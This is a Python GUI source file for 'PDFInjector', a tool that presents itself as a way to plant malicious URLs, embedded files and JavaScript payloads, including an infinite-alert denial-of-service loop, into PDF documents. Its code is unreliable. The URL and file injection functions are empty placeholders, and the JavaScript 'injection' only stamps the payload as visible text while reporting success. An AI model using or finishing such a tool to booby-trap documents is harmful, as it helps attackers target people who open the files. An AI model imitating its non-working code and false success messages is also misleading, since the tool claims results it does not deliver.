import sys
import os
import pyfiglet
from termcolor import colored
import fitz  # PyMuPDF
from PySide6.QtWidgets import (
    QApplication, QMainWindow, QVBoxLayout, QLabel, QLineEdit, QPushButton,
    QFileDialog, QWidget, QComboBox, QMessageBox, QProgressBar
)
from PySide6.QtCore import Qt

# JavaScript payloads
js_payloads = {
    "Alert Box": "app.alert('This is an alert box.');",
    "Denial of Service (DoS)": "while (true) { app.alert('DoS attack!'); }",
    "Print Dialog": "this.print();",
    "Open Website": "app.launchURL('https://example.com', true);",
    "Download File": "app.launchURL('https://example.com/secret_document.pdf', true);",
}

# Display the banner
def display_banner():
    ascii_art = pyfiglet.figlet_format("PDFInjector", font="slant")
    ascii_art_author = pyfiglet.figlet_format("By Kdairatchi", font="digital")
    print(colored(ascii_art, 'cyan'))
    print(colored(ascii_art_author, 'magenta'))

class PDFInjector(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("PDF Injector")
        self.setGeometry(100, 100, 600, 400)

        self.layout = QVBoxLayout()
        self.create_widgets()

        container = QWidget()
        container.setLayout(self.layout)
        self.setCentralWidget(container)

    def create_widgets(self):
        self.add_label("Input PDF:")
        self.input_pdf_lineedit = self.add_line_edit()
        self.add_button("Browse", self.browse_input_pdf)

        self.add_label("Output PDF:")
        self.output_pdf_lineedit = self.add_line_edit()
        self.add_button("Browse", self.browse_output_pdf)

        self.add_label("Malicious URL:")
        self.malicious_url_combobox = QComboBox()
        self.load_malicious_urls()
        self.layout.addWidget(self.malicious_url_combobox)

        self.add_button("Inject URL", self.inject_url)

        self.add_label("File to Inject:")
        self.file_to_inject_lineedit = self.add_line_edit()
        self.add_button("Browse", self.browse_file_to_inject)

        self.add_button("Inject File", self.inject_file)

        self.add_label("JavaScript Payload:")
        self.js_payload_combobox = QComboBox()
        self.js_payload_combobox.addItems(js_payloads.keys())
        self.layout.addWidget(self.js_payload_combobox)

        self.add_button("Inject JavaScript", self.inject_js)

        self.progress_bar = QProgressBar(self)
        self.layout.addWidget(self.progress_bar)

    def load_malicious_urls(self):
        try:
            with open('malicious_urls.txt', 'r') as file:
                urls = file.read().splitlines()
                self.malicious_url_combobox.addItems(urls)
        except FileNotFoundError:
            QMessageBox.critical(self, "Error", "The file 'malicious_urls.txt' was not found.")

    def add_label(self, text):
        label = QLabel(text)
        self.layout.addWidget(label)

    def add_line_edit(self):
        line_edit = QLineEdit()
        self.layout.addWidget(line_edit)
        return line_edit

    def add_button(self, text, slot):
        button = QPushButton(text)
        button.clicked.connect(slot)
        self.layout.addWidget(button)

    def browse_input_pdf(self):
        self.browse_file("Select Input PDF", self.input_pdf_lineedit)

    def browse_output_pdf(self):
        self.browse_file("Select Output PDF", self.output_pdf_lineedit, save=True)

    def browse_file_to_inject(self):
        self.browse_file("Select File to Inject", self.file_to_inject_lineedit)

    def browse_file(self, dialog_title, line_edit, save=False):
        file_name, _ = (QFileDialog.getSaveFileName if save else QFileDialog.getOpenFileName)(
            self, dialog_title, "", "PDF Files (*.pdf);;All Files (*)"
        )
        if file_name:
            line_edit.setText(file_name)

    def validate_inputs(self, inputs):
        if any(not input_field for input_field in inputs):
            QMessageBox.warning(self, "Input Error", "Please fill in all fields.")
            return False
        return True

    def inject_url(self):
        self.inject_pdf(self._inject_url)

    def inject_file(self):
        self.inject_pdf(self._inject_file)

    def inject_js(self):
        input_pdf = self.input_pdf_lineedit.text()
        output_pdf = self.output_pdf_lineedit.text()
        js_payload = js_payloads.get(self.js_payload_combobox.currentText())
        self.progress_bar.setValue(0)

        if not self.validate_inputs([input_pdf, output_pdf]) or not js_payload:
            QMessageBox.warning(self, "Input Error", "Please select a valid JavaScript payload.")
            return

        try:
            doc = fitz.open(input_pdf)

            for page in doc:
                page.insert_text((72, 72), "JavaScript Payload: " + js_payload, fontsize=12)

            doc.save(output_pdf)
            doc.close()

            QMessageBox.information(self, "Success", "JavaScript injected successfully!")
        except Exception as e:
            self.show_error_message("An error occurred while injecting JavaScript.", e)

    def _inject_url(self, doc):
        malicious_url = self.malicious_url_combobox.currentText()
        # Logic for injecting URL goes here

    def _inject_file(self, doc):
        file_to_inject = self.file_to_inject_lineedit.text()
        # Logic for injecting file goes here

    def inject_pdf(self, inject_function):
        input_pdf = self.input_pdf_lineedit.text()
        output_pdf = self.output_pdf_lineedit.text()
        self.progress_bar.setValue(0)

        if not self.validate_inputs([input_pdf, output_pdf]):
            return

        try:
            doc = fitz.open(input_pdf)
            inject_function(doc)

            doc.save(output_pdf)
            doc.close()

            QMessageBox.information(self, "Success", "PDF injected successfully!")
        except Exception as e:
            self.show_error_message("An error occurred while injecting the PDF.", e)

    def show_error_message(self, message, exception):
        QMessageBox.critical(self, "Error", f"{message}\nDetails: {exception}")

if __name__ == "__main__":
    display_banner()
    app = QApplication(sys.argv)
    window = PDFInjector()
    window.show()
    sys.exit(app.exec())
